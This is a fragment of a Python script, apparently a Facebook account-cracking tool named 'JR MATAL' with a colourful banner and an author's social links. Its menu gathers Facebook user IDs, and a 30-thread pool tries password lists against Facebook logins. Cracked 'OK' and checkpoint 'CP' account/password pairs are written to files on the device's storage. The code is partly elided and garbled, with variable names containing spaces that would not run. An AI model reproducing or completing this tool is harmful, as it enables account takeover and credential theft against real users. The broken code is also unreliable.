...
VMMMP" dMP dMP        dMP dMP dMP dMP dMP   dMP   dMP dMP dMMMMMP     dP  {asu}JR{P}     
{asu}---------------------------------------------------{P}
 Author    {M}:\033[1;37m Ariful Khan  
 Github    {M}:\033[1;37m MATAL-BREND
 Facebook  {M}:\033[1;37m Ariful Khan
 Tool Name {M}:{N} JR MATAL {P}
 Future    {M}:\033[1;37m {H}F{P}|{H}R{P}|{H}N{P}|{H}G{P}
 Status    {M}:\033[1;32m Premium{P}
 Version   {M}: {H}1.0.3\033[1;37m
{asu}---------------------------------------------------{P}""")
led = f"""{asu}---------------------------------------------------"""
def login():
    try:
...
def menu(my_name,my_id):
    ...
    try:JR MATAL_nilXd = cek_data["isp"]
    except:JR MATAL_nilXd = {'-'}
    try:JR MATAL_nilSu = cek_data["city"]
    except:JR MATAL_nilSu = {'-'}
    print(f'{P}User City  {M}:{H} {JR MATAL_nilSu}');print(f'{P}User Name  {M}:{H} {my_name}');print(led)
    ...
    JR MATAL_nil = input(f'{P}[{H}+{P}] Choose {M}:{H} ')
    print('')
    if JR MATAL_nil in ['1']:
        dump_publik()
    elif JR MATAL_nil in ['2']:
        dump_massal()
    elif JR MATAL_nil in ['3']:
        cr()
    elif JR MATAL_nil in ['5']:
        os.system('xdg-open https://m.facebook.com/groups/696814409123817/?ref=share&mibextid=afzh1R');time.sleep(3);os.system('xdg-open https://m.facebook.com/groups/696814409123817/?ref=share&mibextid=afzh1R');back()
    elif JR MATAL_nil in ['6']:
        os.system('xdg-open https://github.com/MATAL-BREND/Ariful12/tree/main');time.sleep(2);back()
    elif JR MATAL_nil in ['4']:
        dupcutter()
    elif JR MATAL_nil in ['0']:
...
def dupcutter():
    os.system('clear');banner();print(f' {P}Example   {M}:{H} /sdcard/JR MATAL.txt');print(led)
...
def p4():
    ...
    input('Press Enter To Go Menu');os.system('python JR MATAL-GREEN.py')
def p3():
    os.system("clear");banner();print(f' Crack User From{M} : {H}{frm}{P}');print(f'{P} Total Idz Crack {M}: {H}'+str(len(id)));print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            ...
            if 'mobile' in method:
                ...
                pool.submit(crack,idf,pwv)
    print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+len(ok));print(f' {P}Total cp : {K}'+len(cp));print(led)
    input('Press Enter To Go Menu');os.system('python MATAL-BREND.py')
def p1():
    os.system("clear");banner();print(f' Crack User From{M} : {H}{frm}{P}');print(f'{P} Total Idz Crack {M}: {H}'+str(len(id)));print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
...
def crack(idf,pwv):
    ...
    #fff = '%'
    sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mJR MATAL-XD\033[1;97m] {P}[{B}{(loop)}{P}]{H} OK>{(ok)} {K}CP>{(cp)}\r')
    sys.stdout.flush()
    ses = requests.Session()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\x1b[1;93m[JR MATAL-CP] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/JR MATAL-CP.txt', 'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
                ...
                print('\x1b[1;92m[JR MATAL-OK] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/JR MATAL-OK.txt', 'a').write(idf+'|'+pw+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
